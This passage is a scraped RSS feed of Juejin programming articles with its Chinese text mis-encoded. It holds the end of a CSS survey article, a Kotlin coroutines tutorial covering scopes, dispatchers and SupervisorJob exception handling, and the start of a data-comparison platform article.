<li>èƒ½é™åˆ¶è¡Œæ•°ï¼Œæ— æ³•ç²¾ç¡®æ§åˆ¶é«˜åº¦</li>
<li>æµè§ˆå™¨å…¼å®¹æ€§è¿˜ä¸å¤Ÿå¥½</li>
<li>ä¸åŠ¨æ€å†…å®¹é…åˆå›°éš¾ï¼šå½“æ–‡æœ¬å†…å®¹é•¿åº¦ä¸ç¡®å®šæ—¶ï¼Œéš¾ä»¥å‡†ç¡®æ§åˆ¶æ˜¾ç¤ºæ•ˆæœ</li>
</ul>
<p>å½“æˆ‘ä»¬å®é™…ä½¿ç”¨ line-clamp çš„æ—¶å€™ï¼Œè¿˜è¦é…åˆä¸€ç³»åˆ—å±æ€§æ¯”å¦‚ displayã€-webkit-box-orientã€overflowã€text-overflowï¼Œè¿™ç§ç»„åˆæ–¹æ¡ˆæ—¢å¤æ‚åˆä¸å¤Ÿè¯­ä¹‰åŒ–ã€‚</p>
<h2 data-id="heading-6">7. ç»“è®º</h2>
<p>CSS è¿™äº›å¹´æ— ç–‘åœ¨å¿«é€Ÿçš„å‘å±•ä¸­ï¼Œè€Œäººä»¬å¯¹ CSS çš„æ»¡æ„åº¦ä¹Ÿåœ¨æŒç»­æ”€å‡ã€‚</p>
<p>å¼•ç”¨æŠ¥å‘Šä¸­çš„ä¸€å¥è¯ï¼š</p>
<p><strong>â€œå¦‚æœè¯´ 2025 å¹´çš„ä¸»é¢˜æ˜¯ç¨³å®šä¸å¯èƒ½ä¹‹äº‹ï¼Œé‚£ä¹ˆ 2026 å¹´æˆ–è®¸æ˜¯å®ç°æœŸå¾…å·²ä¹…çš„æ¢¦æƒ³ä¹‹å¹´ã€‚â€</strong></p>
<p>å¯¹äºçƒ­çˆ± CSS çš„äººæ¥è¯´ï¼Œç°åœ¨æ­£æ˜¯å°è¯•ã€å­¦ä¹ å¹¶å‚ä¸å¡‘é€ æœªæ¥å‘å±•æ–¹å‘çš„æœ€ä½³æ—¶æœºã€‚</p>
<p>æˆ‘æ˜¯å†´ç¾½ï¼Œ10 å¹´ç¬”è€•ä¸è¾ï¼Œä¸“æ³¨å‰ç«¯é¢†åŸŸï¼Œæ›´æ–°äº† 10+ ç³»åˆ—ã€300+ ç¯‡åŸåˆ›æŠ€æœ¯æ–‡ç« ï¼Œç¿»è¯‘è¿‡ Svelteã€Solid.jsã€TypeScript æ–‡æ¡£ï¼Œè‘—æœ‰å°å†Œã€ŠNext.js å¼€å‘æŒ‡å—ã€‹ã€ã€ŠSvelte å¼€å‘æŒ‡å—ã€‹ã€ã€ŠAstro å®æˆ˜æŒ‡å—ã€‹ã€‚</p>
<p>æ¬¢è¿å›´è§‚æˆ‘çš„â€œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">ç½‘é¡µç‰ˆæœ‹å‹åœˆ</a>â€ï¼Œå…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼š<strong>å†´ç¾½ï¼ˆæˆ–æœç´¢ yayujsï¼‰</strong>ï¼Œæ¯å¤©åˆ†äº«å‰ç«¯çŸ¥è¯†ã€AI å¹²è´§ã€‚</p>
<p>æ–°çš„ä¸€å¹´ï¼Œå¦‚æœä½ æƒ³å¿«é€Ÿæ”¹å˜è‡ªå·±ï¼Œæ¬¢è¿åŠ å…¥æˆ‘çš„çŸ¥è¯†æ˜Ÿçƒï¼šâ€œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2Fcourse%3Fto%3Dzsxq" target="_blank" title="https://yayujs.com/course?to=zsxq" ref="nofollow noopener noreferrer">å†´ç¾½Â·å‰ç«¯å¤§ä½¬æˆé•¿ä¹‹è·¯</a>â€ï¼Œ10 å¹´å·¥ä½œæ€»ç»“ã€100+ ç¯‡ç²¾åä¸»é¢˜ã€70W å­—åŸåˆ›å†…å®¹ï¼Œå¸¦ä½ å‡çº§è®¤çŸ¥ã€é‡æ„ç”Ÿæ´»ã€å»ºç«‹çŸ¥è¯†ç®¡ç†ç³»ç»Ÿã€é€šå…³é¢è¯•ã€å¼•é¢†èŒåœºã€‚ç”¨ä¸€å¹´æ—¶é—´ï¼Œå®ç°åå€æˆé•¿ï¼Œä¸€é¸£æƒŠäººã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin åç¨‹-åŸºç¡€ç¯‡]]></title>    <link>https://juejin.cn/post/7597125475601629211</link>    <guid>https://juejin.cn/post/7597125475601629211</guid>    <pubDate>2026-01-20T10:26:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475601629211" data-draft-id="7596874392824873002" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin åç¨‹-åŸºç¡€ç¯‡"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-20T10:26:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jony_"/> <meta itemprop="url" content="https://juejin.cn/user/3403743732709767"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin åç¨‹-åŸºç¡€ç¯‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3403743732709767/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jony_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:26:21.000Z" title="Tue Jan 20 2026 10:26:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å‰è¨€</h2>
<p>æœ¬æœŸæ˜¯åç¨‹çš„åŸºç¡€ç¯‡ï¼Œä¼šä»åç¨‹ä½œç”¨åŸŸã€ä¸Šä¸‹æ–‡ã€å¯åŠ¨æ¨¡å¼ç­‰æ–¹é¢è®²è¿°å¦‚ä½•å»ä½¿ç”¨åç¨‹ã€‚å¹¶ä¸”ï¼Œä¼šåŸºäºåç¨‹æä¾›çš„æ¡†æ¶ï¼Œå°è£…å·¥ä½œä¸­å¸¸ç”¨çš„åŸºç¡€èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-1">äºŒã€åç¨‹ä½œç”¨åŸŸ</h2>
<p>åˆå­¦åç¨‹çš„æ—¶å€™ï¼Œå°±å¬è¯´è¿‡æŒ‚èµ·å‡½æ•°å¿…é¡»åœ¨å¦ä¸€ä¸ªæŒ‚èµ·å‡½æ•°ä¸­æˆ–è€…åç¨‹ä½œç”¨åŸŸä¸­æ‰èƒ½è¢«è°ƒç”¨ã€‚é‚£ä¹ˆï¼Œåç¨‹ä½œç”¨åŸŸæ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•åˆ›å»ºä¸€ä¸ªåç¨‹ä½œç”¨åŸŸï¼Ÿ</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    GlobalScope.launch { }
}

<span class="hljs-keyword">object</span> GlobalScope : CoroutineScope {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> coroutineContext: CoroutineContext
        <span class="hljs-keyword">get</span>() = EmptyCoroutineContext
}
</code></pre>
<p>å®ç°äº† CoroutineScope çš„ç±»ï¼Œåˆ›å»ºè¯¥ç±»çš„å¯¹è±¡ï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ªåç¨‹ä½œç”¨åŸŸã€‚</p>
<p>GlobalScope æ˜¯åç¨‹æ¡†æ¶æä¾›çš„ä¸€ä¸ªå…¨å±€ä½œç”¨åŸŸï¼Œç”±äºå®ƒæ˜¯é™æ€çš„ï¼Œå› æ­¤å®ƒçš„ç”Ÿå‘½å‘¨æœŸä¸€ç›´æŒç»­åˆ°åº”ç”¨ç¨‹åºç»ˆæ­¢ã€‚åœ¨Androidé¢†åŸŸä¸­ï¼ŒGoogle æä¾›ä¸€ä¸ªä¸€ç³»åˆ—å…·æœ‰ç”Ÿå‘½å‘¨æœŸæ„ŸçŸ¥çš„ CoroutineScopeã€‚</p>
<ol>
<li>LifecycleScopeï¼šèƒ½ç›‘å¬é¡µé¢çš„ç”Ÿå‘½å‘¨æœŸï¼Œåœ¨é¡µé¢é”€æ¯çš„æ—¶å€™ï¼Œå–æ¶ˆåç¨‹</li>
<li>ViewModelScopeï¼šèƒ½å¤Ÿå’Œ ViewModel ç»‘å®šï¼Œåœ¨ ViewModel é”€æ¯çš„æ—¶å€™å–æ¶ˆåç¨‹</li>
<li>MainScopeï¼šä½œç”¨åœ¨ä¸»çº¿ç¨‹çš„åç¨‹ä½œç”¨åŸŸèƒ½å¤Ÿåœ¨è¿™é‡Œè¿›è¡Œ UI çš„æ›´æ–°</li>
</ol>
<h2 data-id="heading-2">ä¸‰ã€åç¨‹ä¸Šä¸‹æ–‡</h2>
<p>åç¨‹ä¸Šä¸‹æ–‡æ˜¯ä¸€ç³»åˆ—çš„å®ç°äº† Element çš„é›†åˆï¼ŒåŒ…æ‹¬äº† Jobã€CoroutineExceptionHandlerã€Dispatchersç­‰ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">CoroutineContext = Job() + CoroutineName(<span class="hljs-string">""</span>) + CoroutineExceptionHandler { coroutineContext, throwable -&gt; } + Dispatchers.IO
</code></pre>
<p>å¦å¤–ï¼Œåç¨‹ä¸Šä¸‹æ–‡ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œè‡ªå®šä¹‰çš„ï¼Œåªéœ€è¦ç»§æ‰¿ Element å°±å¯ä»¥äº†ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserCoroutineContext</span>(<span class="hljs-keyword">val</span> id: String) : CoroutineContext.Element {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> key = KEY

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> KEY : CoroutineContext.Key&lt;UserCoroutineContext&gt;
}
</code></pre>
<h2 data-id="heading-3">å››ã€åç¨‹å¯åŠ¨æ¨¡å¼</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoroutineStart</span> {
    DEFAULT,
    LAZY,
    <span class="hljs-meta">@ExperimentalCoroutinesApi</span> <span class="hljs-comment">// Since 1.0.0, no ETA on stability</span>
    ATOMIC,
    UNDISPATCHED;
}
</code></pre>
<p>æˆ‘ä»¬é€šå¸¸ç”¨ <strong>DEFAULT</strong> å’Œ <strong>LAZY</strong> çš„åœºæ™¯æ¯”è¾ƒå¤šï¼Œè¿™å››ç§å¯åŠ¨æ¨¡å¼çš„å¾ˆå¥½ç†è§£ï¼Œè§£é‡Šå¦‚ä¸‹ï¼š</p>
<ol>
<li>DEFAULTï¼šé»˜è®¤çš„å¯åŠ¨æ¨¡å¼ï¼Œåç¨‹åˆ›å»ºå®Œæˆä¹‹åå°±å¼€å§‹è°ƒåº¦</li>
<li>LAZYï¼šæ‡’åŠ è½½æ¨¡å¼ï¼Œä¾‹å¦‚ async ä¹‹åä¸ç›´æ¥å¯åŠ¨ï¼Œè€Œæ˜¯åœ¨ await ä¹‹åæ‰å¼€å§‹è°ƒåº¦</li>
<li>ATOMICï¼šå¯åŠ¨ä¹‹å‰ä¸å¯å–æ¶ˆ</li>
<li>UNDISPATCHEDï¼šç›´æ¥åŸºäºå½“å‰çº¿ç¨‹è°ƒç”¨ï¼Œç›´åˆ°é‡åˆ°ç¬¬ä¸€ä¸ªæŒ‚èµ·ç‚¹ï¼Œæ‰ä¼šåˆ‡æ¢åˆ° Dispatchers æŒ‡å®šçš„çº¿ç¨‹è¿›è¡Œè°ƒåº¦</li>
</ol>
<h2 data-id="heading-4">äº”ã€åç¨‹è°ƒåº¦å™¨</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">object</span> Dispatchers {
    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> Default: CoroutineDispatcher = DefaultScheduler

    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> Main: MainCoroutineDispatcher <span class="hljs-keyword">get</span>() = MainDispatcherLoader.dispatcher

    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> Unconfined: CoroutineDispatcher = kotlinx.coroutines.Unconfined

    <span class="hljs-meta">@JvmStatic</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> IO: CoroutineDispatcher = DefaultIoScheduler
}
</code></pre>
<p>åç¨‹çš„è°ƒåº¦æ–¹å¼åˆ†ä¸º 4 ç§ï¼Œè§£é‡Šå¦‚ä¸‹ï¼š</p>
<ol>
<li>Defaultï¼šå¤„ç† CPU å¯†é›†å‹çš„ä»»åŠ¡</li>
<li>Mainï¼šä¸»çº¿ç¨‹æ‰§è¡Œ</li>
<li>Unconfinedï¼šä¸æŒ‡å®šçº¿ç¨‹ï¼Œç›´åˆ°é‡åˆ°ç¬¬ä¸€ä¸ªæŒ‚èµ·ç‚¹ï¼ŒæŒ‚èµ·æ¢å¤ä¹‹åï¼Œåˆ‡æ¢åˆ°é»˜è®¤çš„çº¿ç¨‹</li>
<li>IOï¼šIO çº¿ç¨‹æ‰§è¡Œ</li>
</ol>
<h2 data-id="heading-5">å…­ã€åç¨‹å¼‚å¸¸å¤„ç†</h2>
<p>åœ¨ä¸€ä¸ªåç¨‹ä½œç”¨åŸŸå†…ï¼Œå¯åŠ¨äº†å¤šä¸ªåç¨‹ï¼Œå¦‚æœæŸä¸ªåç¨‹å¤±è´¥ï¼Œé‚£ä¹ˆå…¶å®ƒçš„åç¨‹ä¹Ÿä¼šå—åˆ°å½±å“è¢«å–æ¶ˆï¼Œå¦‚ä¸‹å›¾å®ä¾‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c0b8eae961c420dbfbd3ba03bc17455~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9ueV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509581&amp;x-signature=j6j0eVG%2FdyAvDg5C%2FML0fcn8StM%3D" alt="image.png" loading="lazy"/></p>
<p>å¦‚æœè¦è®©å­åç¨‹ä¹‹é—´ä¸ä¼šç›¸äº’å½±å“ï¼Œå¯ä»¥ä½¿ç”¨ <strong>SupervisorJob</strong>ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    runBlocking {
        GlobalScope.launch {
            <span class="hljs-keyword">val</span> job1 = async(SupervisorJob()) {
                println(<span class="hljs-string">"job1"</span>)
                delay(<span class="hljs-number">1000</span>)
                error(<span class="hljs-string">"é”™è¯¯ï¼ï¼ï¼ï¼"</span>)
            }
            <span class="hljs-keyword">val</span> job2 = async() {
                delay(<span class="hljs-number">2000</span>)
                println(<span class="hljs-string">"job2"</span>)
            }
            job2.await()
            job1.await()
        }.join()
    }
}
</code></pre>
<p>æ—¥å¿—è¾“å‡ºå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-swift" lang="swift">job1
job2
<span class="hljs-type">Exception</span> <span class="hljs-keyword">in</span> thread <span class="hljs-string">"DefaultDispatcher-worker-1"</span> java.lang.<span class="hljs-type">IllegalStateException</span>: é”™è¯¯ï¼ï¼ï¼ï¼
	at com.xxxx.xxxx.xxxx.xxxxx.viewmodels.<span class="hljs-type">AKt</span><span class="hljs-variable">$main</span><span class="hljs-variable">$1</span><span class="hljs-variable">$1</span><span class="hljs-variable">$job1</span><span class="hljs-variable">$1</span>.invokeSuspend(<span class="hljs-type">A</span>.kt:<span class="hljs-number">42</span>)
</code></pre>
<p>job1 çš„å¤±è´¥ä¸ä¼šå½±å“ job2 çš„è¾“å‡ºï¼Œä½†æ˜¯åº”ç”¨ç¨‹åºä¾ç„¶ä¼šå‘ç”Ÿ Crashã€‚SupervisorJob èƒ½å¤Ÿé˜»æ­¢å¼‚å¸¸çš„ä¼ æ’­ï¼Œä½†æ˜¯æŠ›å‡ºçš„å¼‚å¸¸ä»ç„¶éœ€è¦è¢«æ­£ç¡®å¤„ç†æ‰è¡Œã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    runBlocking {
        <span class="hljs-keyword">val</span> handle = CoroutineExceptionHandler { coroutineContext, throwable -&gt;
            println(throwable.message)
        }
        GlobalScope.launch(handle) {
            <span class="hljs-keyword">val</span> job1 = async(SupervisorJob() ) {
                println(<span class="hljs-string">"job1"</span>)
                delay(<span class="hljs-number">1000</span>)
                error(<span class="hljs-string">"é”™è¯¯ï¼ï¼ï¼ï¼"</span>)
            }
            <span class="hljs-keyword">val</span> job2 = async() {
                delay(<span class="hljs-number">2000</span>)
                println(<span class="hljs-string">"job2"</span>)
            }
            job2.await()
            job1.await()
        }.join()
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Galaxyæ¯”æ•°å¹³å°åŠŸèƒ½ä»‹ç»åŠå®ç°åŸç†ï½œå¾—ç‰©æŠ€æœ¯]]></title>    <link>https://juejin.cn/post/7597083949833928710</link>    <guid>https://juejin.cn/post/7597083949833928710</guid>    <pubDate>2026-01-20T06:17:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597083949833928710" data-draft-id="7596962772145356815" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Galaxyæ¯”æ•°å¹³å°åŠŸèƒ½ä»‹ç»åŠå®ç°åŸç†ï½œå¾—ç‰©æŠ€æœ¯"/> <meta itemprop="keywords" content="å¤§æ•°æ®"/> <meta itemprop="datePublished" content="2026-01-20T06:17:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾—ç‰©æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/2392954206960247"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Galaxyæ¯”æ•°å¹³å°åŠŸèƒ½ä»‹ç»åŠå®ç°åŸç†ï½œå¾—ç‰©æŠ€æœ¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392954206960247/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾—ç‰©æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T06:17:08.000Z" title="Tue Jan 20 2026 06:17:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
